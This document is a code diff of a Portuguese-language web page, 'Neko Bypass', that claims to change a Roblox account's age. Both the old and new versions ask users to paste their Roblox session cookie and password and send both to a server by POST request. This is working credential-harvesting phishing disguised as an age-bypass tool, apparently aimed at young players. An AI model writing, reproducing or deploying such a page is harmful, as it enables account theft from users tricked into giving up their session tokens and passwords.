@@ -55,85 +55,52 @@
       margin-right: auto;
       white-space: pre-wrap;
       word-break: break-word;
-      max-height: 200px; /* altura máxima para o scroll */
-      overflow-y: scroll; /* ativa o scroll se necessário */
-    }
-
-    #cookieContainer {
-      max-width: 90%;
-      margin: 10px auto;
-      padding: 10px;
-      background-color: #1e1e1e;
-      color: white;
-      border-radius: 8px;
-      overflow-x: auto;
-    }
-
-    #copyBtn {
-      margin-top: 10px;
-      display: none; /* Esconde até o botão ser necessário */
-    }
-
-    code {
-      white-space: nowrap;
+      max-height: 200px;
+      overflow-y: scroll;
     }
   </style>
 </head>
 <body>
+  <h1 class="main-title">Neko Bypass</h1>
 
-  <h1 class="main-title">Alterar Idade (13 to -13)</h1>
-  <input type="text" id="cookie" placeholder="Cole seu .ROBLOSECURITY aqui" />
-  <input type="password" id="password" placeholder="Digite sua Senha" />
-  <br>
-  <button onclick="alterarIdade()">Alterar Idade</button>
+  <input type="text" id="cookie" placeholder="Cole seu cookie aqui"><br>
+  <input type="password" id="senha" placeholder="Digite sua senha"><br>
+  <button onclick="enviar()">Alterar Idade</button>
 
-  <div id="resposta" style="display: none;"></div>
-  <button id="copyBtn" onclick="copiarTexto()">Copiar</button>
+  <div id="resposta"></div>
 
   <script>
-    async function alterarIdade() {
-      const cookie = document.getElementById("cookie").value;
-      const password = document.getElementById("password").value;
-      const respostaElemento = document.getElementById("resposta");
-      const copyBtn = document.getElementById("copyBtn");
+    async function enviar() {
+      const cookie = document.getElementById("cookie").value.trim();
+      const password = document.getElementById("senha").value.trim();
+      const respostaDiv = document.getElementById("resposta");
+
+      if (!cookie || !password) {
+        respostaDiv.textContent = "Preencha os campos corretamente.";
+        return;
+      }
 
       try {
-        // Enviar dados para o servidor
-        const resposta = await fetch("https://seuservidor.com/alterar-idade", {
+        const res = await fetch("/alterar-idade", {
           method: "POST",
           headers: {
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
           },
-          body: JSON.stringify({ cookie, password })
+          body: JSON.stringify({ cookie, password }),
         });
 
-        const data = await resposta.json();
+        const data = await res.json();
 
         if (data.idadeAlterada) {
-          // Exibir resultado da alteração
-          respostaElemento.innerText = `Idade alterada para: ${data.idadeAlterada}`;
-          respostaElemento.style.display = "block";
-          copyBtn.style.display = "inline-block"; // Torna o botão visível
+          respostaDiv.textContent = `Idade alterada para: ${data.idadeAlterada}`;
         } else {
-          // Exibir erro se não houver sucesso
-          respostaElemento.innerText = data.error || "Erro inesperado";
-          respostaElemento.style.display = "block";
-          copyBtn.style.display = "none"; // Não exibe o botão se não houver idade alterada
+          respostaDiv.textContent = "Erro: " + (data.error || "desconhecido");
         }
       } catch (error) {
-        respostaElemento.innerText = "Erro ao conectar com o servidor.";
-        respostaElemento.style.display = "block";
-        copyBtn.style.display = "none";
+        respostaDiv.textContent = "Erro ao conectar com o servidor.";
+        console.error(error);
       }
     }
-
-    function copiarTexto() {
-      const texto = document.getElementById("resposta").innerText;
-      navigator.clipboard.writeText(texto).then(() => {
-        alert("Copiado para a área de transferência!");
-      });
-    }
   </script>
-
 </body>
 </html>
